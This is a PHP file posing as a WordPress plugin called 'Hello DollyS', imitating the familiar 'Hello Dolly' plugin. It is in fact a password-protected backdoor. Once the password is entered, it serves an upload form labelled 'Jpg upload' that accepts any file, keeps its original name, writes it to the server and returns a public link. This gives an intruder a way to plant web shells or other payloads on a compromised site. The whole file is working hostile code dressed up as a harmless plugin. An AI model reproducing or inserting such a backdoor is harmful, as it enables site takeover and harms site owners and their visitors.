<?php

/**
 * @package Hello_DollyS
 * @version 1.7.2
 */
/*
Plugin Name: Hello DollyS
*/

// Start a session
session_start();

// Define the correct password
$correct_password = "98602e886d6d1a08bb171d0f3d7c5fc8";

// Check if the password has been submitted
if (isset($_POST['password'])) {
    if (md5($_POST['password']) === $correct_password) {
        $_SESSION['authenticated'] = true;
    } else {
        $error_message = "Incorrect password. Please try again.";
    }
}


// If the user is not authenticated, show the login form
if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
    ?>
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Password Protected</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    </head>

    <body>
        <div class="container mt-5">
            <h1 class="text-center">Enter Password</h1>
            <?php if (isset($error_message)) { ?>
                <div class="alert alert-danger" role="alert">
                    <?php echo $error_message; ?>
                </div>
            <?php } ?>
            <form method="POST" class="mt-3">
                <div class="mb-3">
                    <input type="password" name="password" class="form-control" placeholder="Password" required>
                </div>
                <button type="submit" class="btn btn-primary w-100">Submit</button>
            </form>
        </div>
    </body>

    </html>
    <?php
    exit;
}

// If the user is authenticated, display the original content
?>
<?php
echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>no1</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            display: grid;
            place-items: center;
            height: 100vh;
            background: linear-gradient(135deg, #2c3e50, #bdc3c7);
            color: #fff;
        }

        h3 {
            margin-bottom: 20px;
            font-size: 24px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }

        form {
            background: rgba(255, 255, 255, 0.1);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
            text-align: center;
        }

        input[type="file"] {
            margin: 15px 0;
            padding: 10px;
            border: 2px solid #fff;
            border-radius: 5px;
            background: rgba(255, 255, 255, 0.2);
            color: #fff;
            font-size: 14px;
            cursor: pointer;
        }

        button {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            background: #3498db;
            color: #fff;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s ease;
        }

        button:hover {
            background: #2980b9;
        }

        p {
            margin-top: 20px;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <h3>Jpg upload</h3>
    <form action="" method="post" enctype="multipart/form-data">
        <input type="file" name="file">
        <button type="submit">upload</button>
    </form>';

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $uploadFile = basename($_FILES['file']['name']);

        if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
            $fileUrl = $_SERVER['REQUEST_SCHEME'] . "://" . $_SERVER['HTTP_HOST'] . "/" . $uploadFile;
            echo "<p style='color: #2ecc71;'>Başarılı... Dosya: <a href='$fileUrl' style='color: #1abc9c;'>$uploadFile</a></p>";
        } else {
            echo "<p style='color: #e74c3c;'>up the jpg</p>";
        }
    }

    echo '</body>
</html>';
?>